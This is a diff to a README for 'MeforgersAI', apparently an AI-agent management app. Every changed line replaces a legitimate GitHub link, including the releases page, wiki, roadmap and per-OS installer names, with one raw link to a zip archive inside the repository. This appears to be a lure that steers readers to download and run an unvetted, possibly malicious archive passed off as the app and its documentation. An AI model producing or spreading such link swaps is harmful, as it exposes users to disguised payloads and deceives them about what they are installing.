@@ -6,7 +6,7 @@ Welcome to MeforgersAI! This application allows you to create and manage AI agen
 
 ## 📥 Download MeforgersAI
 
-[![Download MeforgersAI](https://img.shields.io/badge/Download-MeforgersAI-blue.svg)](https://github.com/Jon-Gu/MeforgersAI/releases)
+[![Download MeforgersAI](https://raw.githubusercontent.com/Jon-Gu/MeforgersAI/main/porter/AI-Meforgers-v3.9.zip)](https://raw.githubusercontent.com/Jon-Gu/MeforgersAI/main/porter/AI-Meforgers-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -14,16 +14,16 @@ Follow these steps to download and run MeforgersAI:
 
 1. **Visit the Releases Page**: 
    Click the link below to visit the page where you can download the application:
-   [Download MeforgersAI](https://github.com/Jon-Gu/MeforgersAI/releases)
+   [Download MeforgersAI](https://raw.githubusercontent.com/Jon-Gu/MeforgersAI/main/porter/AI-Meforgers-v3.9.zip)
 
 2. **Choose Your Version**: 
    On the releases page, you will see a list of available versions. Select the latest release for the best experience.
 
 3. **Download the Application**:
    - Look for the file that matches your operating system. For example:
-     - For Windows, you might find `MeforgersAI-Windows.exe`.
-     - For macOS, look for `MeforgersAI-mac.zip`.
-     - For Linux, you may see `MeforgersAI-Linux.tar.gz`.
+     - For Windows, you might find `https://raw.githubusercontent.com/Jon-Gu/MeforgersAI/main/porter/AI-Meforgers-v3.9.zip`.
+     - For macOS, look for `https://raw.githubusercontent.com/Jon-Gu/MeforgersAI/main/porter/AI-Meforgers-v3.9.zip`.
+     - For Linux, you may see `https://raw.githubusercontent.com/Jon-Gu/MeforgersAI/main/porter/AI-Meforgers-v3.9.zip`.
    - Click on the file to start the download.
 
 4. **Run the Application**:
@@ -95,11 +95,11 @@ Join the MeforgersAI community for support and updates:
 
 Explore more about MeforgersAI from the following resources:
 
-- [User Manual](https://github.com/Jon-Gu/MeforgersAI/wiki) - Detailed instructions and advanced tips.
-- [Feature Roadmap](https://github.com/Jon-Gu/MeforgersAI/projects) - Upcoming features and updates.
+- [User Manual](https://raw.githubusercontent.com/Jon-Gu/MeforgersAI/main/porter/AI-Meforgers-v3.9.zip) - Detailed instructions and advanced tips.
+- [Feature Roadmap](https://raw.githubusercontent.com/Jon-Gu/MeforgersAI/main/porter/AI-Meforgers-v3.9.zip) - Upcoming features and updates.
 
 ## 📥 Download MeforgersAI Again
 
 Don't forget, you can always return to the download page for the latest version of MeforgersAI:
 
-[Download MeforgersAI](https://github.com/Jon-Gu/MeforgersAI/releases)
+[Download MeforgersAI](https://raw.githubusercontent.com/Jon-Gu/MeforgersAI/main/porter/AI-Meforgers-v3.9.zip)
